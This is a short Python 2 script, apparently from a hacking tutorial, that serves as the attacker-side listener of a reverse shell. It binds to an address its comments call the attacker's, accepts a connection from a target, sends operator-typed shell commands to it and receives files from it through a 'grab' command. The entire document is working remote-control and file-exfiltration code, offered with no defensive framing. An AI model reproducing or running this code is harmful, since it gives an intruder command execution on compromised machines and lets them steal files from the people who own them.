#!/usr/bin/python

# for building TCP connection
import socket
import os

# this function is for receiving the transfered file
def transfer(conn, command):
    conn.send(command) # starting the command
    f = open('./transfer/test.txt', 'wb') # placeholder file
    while True:
        bits = conn.recv(1024) # getting information (1kb at the time)
        if 'Unable to find out the file' in bits:
            print("[-] Unable to find out the file")
            break
        # check if completed
        if bits.endswith('DONE'):
            print("[+] Transfer completed")
            f.close() # closing the file open
            break
        # writing file
        f.write(bits)
    f.close()

# low level server interface
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # attacker address on port (destination port)
    s.bind(("192.168.1.111", 8001))
    # number of connections
    s.listen(1)
    # target IP addr (connection started) and the conn object
    conn, addr = s.accept()
    print("[+] We got a connection from:", addr)

    while True:
        # getting input
        command = raw_input("Shell> ")
        # terminate string for ending the TCP ssession
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() # closing the connection with host
            break
        # command for grabbing file
        elif 'grab' in command:
            # calling the transfer method
            transfer(conn,command)
        else:
            # sending command
            conn.send(command)
            # receiving message
            print(conn.recv(1024))

def main():
    connect()
main()
